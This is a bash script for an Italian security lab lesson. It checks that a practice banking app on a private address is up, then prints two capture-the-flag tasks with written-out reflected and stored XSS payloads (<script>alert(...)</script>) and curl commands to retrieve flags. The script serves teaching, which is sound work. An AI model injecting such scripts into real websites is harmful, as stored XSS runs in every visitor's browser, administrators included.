#!/usr/bin/env bash
# Lezione 14 · lato Kali · XSS riflesso e memorizzato. Sola lettura. Idempotente.
set -uo pipefail
TARGET_IP="10.10.10.20"
echo "== Lezione 14 · Cross-Site Scripting (XSS) =="
echo
if curl -s -o /dev/null -m 4 "http://${TARGET_IP}:8080/bacheca"; then
  echo "[OK] La Banca risponde su :8080."
else
  echo "[--] La Banca non risponde. Sul bersaglio:  lab 12  e poi  lab 14 ."
fi
cat <<'MSG'

------------------------------------------------------------
 MISSIONE · Far eseguire il TUO codice nel browser altrui
------------------------------------------------------------
 L'XSS avviene quando un sito mostra cio' che scrivi senza ripulirlo:
 il tuo testo viene interpretato come codice HTML/JavaScript.

 Apri la Banca in Firefox:  http://10.10.10.20:8080

 [ ] 1  XSS RIFLESSO nella ricerca                             (+30)
        Vai su "Cerca conto" e scrivi:   <script>alert('xss')</script>
        In Firefox comparira' il pop-up. Poi leggi la flag nel sorgente:
        curl "http://10.10.10.20:8080/cerca?conto=<script>alert(1)</script>" | grep FLAG

 [ ] 2  XSS MEMORIZZATO nella bacheca                          (+40)
        Vai su "Bacheca" e pubblica un messaggio:
           <script>alert('bucato')</script>
        Ricarica la pagina: il codice parte per CHIUNQUE la apra.
        Leggi la flag:
        curl "http://10.10.10.20:8080/bacheca" | grep FLAG

 Rifletti: un messaggio memorizzato colpisce ogni visitatore, anche l'admin.
------------------------------------------------------------
MSG
